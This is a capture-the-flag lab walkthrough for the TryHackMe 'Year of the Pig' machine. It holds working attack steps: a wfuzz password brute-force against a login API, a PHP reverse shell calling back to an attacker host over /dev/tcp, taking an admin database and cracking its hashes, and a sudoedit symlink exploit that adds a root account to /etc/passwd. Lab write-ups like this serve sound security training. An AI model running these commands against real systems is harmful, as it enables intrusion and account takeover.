# [Year of the Pig](https://tryhackme.com/room/yearofthepig)

## Some pigs do fly...

# Flags

## Some pigs fly, and some have stories to tell. Get going!

### Flag 1

_Case matters. T-Minus 120s._

1. Start by scanning the target machine to discover open ports and running services.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Use Gobuster to discover hidden directories and files on the web server.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 50
```

**Results:**

```
/admin                (Status: 301) [Size: 314] [--> http://<TARGET_IP>/admin/]
/assets               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/assets/]
/css                  (Status: 301) [Size: 312] [--> http://<TARGET_IP>/css/]
/js                   (Status: 301) [Size: 311] [--> http://<TARGET_IP>/js/]
/api                  (Status: 301) [Size: 312] [--> http://<TARGET_IP>/api/]
/server-status        (Status: 403) [Size: 278]
```

3. After attempting to log in to `/admin`, the interface reveals a password hint: `Remember that passwords should be a memorable word, followed by two numbers and a special character`. This gives us the password format to work with.

```bash
cewl http://<TARGET_IP> > initial-list
```

4. Open the John configuration file and modify the wordlist rules to capitalize words.

```bash
sudo nano /etc/john/john.conf
```

In the `[List.Rules:Wordlist]` section, comment out all rules except:

- `-c >3 !?X l Q`
- `-c (?a >2 !?X c Q`

These rules will capitalize the first letter of words with more than 3 characters.

<img width="371" height="146" alt="SCREEN01" src="https://github.com/user-attachments/assets/2aee656e-9e02-4214-a33b-245c3f54a345" />

5. Apply the capitalization rules to create a new wordlist.

```bash
john -w=initial-list --rules --stdout > capitalised-list
```

6. Return to `/etc/john/john.conf`, comment out the previous rules, and add a new rule to append two digits and a special character: `$[0-9]$[0-9]$[!.?,]`

<img width="224" height="58" alt="SCREEN02" src="https://github.com/user-attachments/assets/ef154d28-b85e-409c-9855-09b193c15729" />

7. Apply the mutation rules to create passwords following the discovered format.

```bash
john -w=capitalised-list --rules --stdout > mutated-list
```

8.  Inspect the POST request to `http://<TARGET_IP>/api/login` using browser developer tools. Notice that the JavaScript file `http://<TARGET_IP>/js/md5.min.js` is used to hash passwords with MD5 before transmission.

<img width="1050" height="200" alt="SCREEN03" src="https://github.com/user-attachments/assets/da663fa6-fcfb-47d8-91dd-4def14157141" />

9. Create a Python script to MD5 hash each password in the wordlist, matching the login mechanism.

```python
import hashlib

with open('mutated-list', 'r') as input_file, open('hashed-list', 'w') as output_file:
    for line in input_file:
        password = line.strip()
        md5_hash = hashlib.md5(password.encode()).hexdigest()
        output_file.write(md5_hash + '\n')

print("Hashing complete. Output saved to hashed-list")
```

10. Use wfuzz to test all hashed passwords against the login API. The `--hh 63` flag filters out responses with 63 characters (failed login responses).

```bash
wfuzz -w hashed-list -H "User-Agent: Bypass" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://<TARGET_IP>/api/login --hh 63
```

11. When wfuzz finds a valid hash, locate it in the hashed-list and retrieve the corresponding plaintext password from mutated-list.

```bash
sed -n '28061p' mutated-list
```

12. Use the discovered credentials to SSH into the target machine as user `marco`.

```bash
ssh marco@<TARGET_IP>
# Password: savoia21!
```

13. Read the first flag from marco's home directory.

```bash
cat flag1.txt
```

<img width="645" height="239" alt="SCREEN04" src="https://github.com/user-attachments/assets/bda3864a-c518-4c48-93c0-e421bf9539ea" />

---

### Flag 2

1. As user `marco`, create a PHP reverse shell in the web server directory. Marco has write permissions to `/var/www/html/`.

```bash
echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'\''"); ?>' > /var/www/html/shell.php
```

2. On your attacking machine, start a netcat listener to catch the reverse shell.

```bash
nc -lvnp 4444
```

3. Visit `http://<TARGET_IP>/shell.php` in your browser to execute the PHP shell and establish a reverse connection.

4. Set up a simple HTTP server in the web directory to transfer files.

```bash
cd /var/www
python3 -m http.server
```

5. On your attacking machine, download the admin database file.

```bash
wget <TARGET_IP>:8000/admin.db
```

6. Use SQLite to examine the database and extract user credentials.

```bash
sqlite3 admin.db
.tables
users
.schema users
select * from users;
```

7. Copy the second hash from the database output and use [CrackStation](https://crackstation.net/) to crack it.

8. Switch to the curtis user account using the cracked password.

```bash
su curtis
# Password: Donald1983$
```

9. Read the second flag from curtis's home directory.

```bash
cat /home/curtis/flag2.txt
```

<img width="596" height="246" alt="SCREEN05" src="https://github.com/user-attachments/assets/6aa00c5d-cdac-4be6-a0e8-dad50b6f7ea6" />

---

### Root Flag

1. Examine what commands curtis can run with sudo.

```bash
sudo -l
```

**Results:**

```
(ALL : ALL) sudoedit /var/www/html/*/*/config.php
```

2. Identify the sudo version to check for known vulnerabilities.

```bash
sudo --version
```

**Results:**

```
Sudo version 1.8.13
```

3. [CVE-2015-5602](https://www.exploit-db.com/exploits/37710) allows editing arbitrary files through symbolic links. Exit to marco's shell and create the directory structure and symbolic link.

```bash
exit
mkdir -p /var/www/html/dir1/dir2
ln -s /etc/passwd /var/www/html/dir1/dir2/config.php
```

4. Create a password hash for the new root user. Using SHA-512 with a salt.

```bash
openssl passwd -6 --salt randomsalt p@sswword1
```

5. Switch back to curtis and use sudoedit to modify the symlinked file. Add a new line at the end with a custom username:

```bash
su curtis
sudo /usr/bin/sudoedit /var/www/html/dir1/dir2/config.php
```

Add this line at the end:

```
<USER_NAME>:$6$randomsalt$u3d7eIp0R4yjKJ9/WrBobNz6RfZfz5UkpkMy9Rs4FhTCp9/HFhYT3WK8m4FHMBaUzx6QYjaJNrzOio8SSw6dL1:0:0::/root:/bin/bash
```

6. Switch to the newly created user and retrieve the root flag.

```bash
su <USER_NAME>
cat /root/root.txt
```
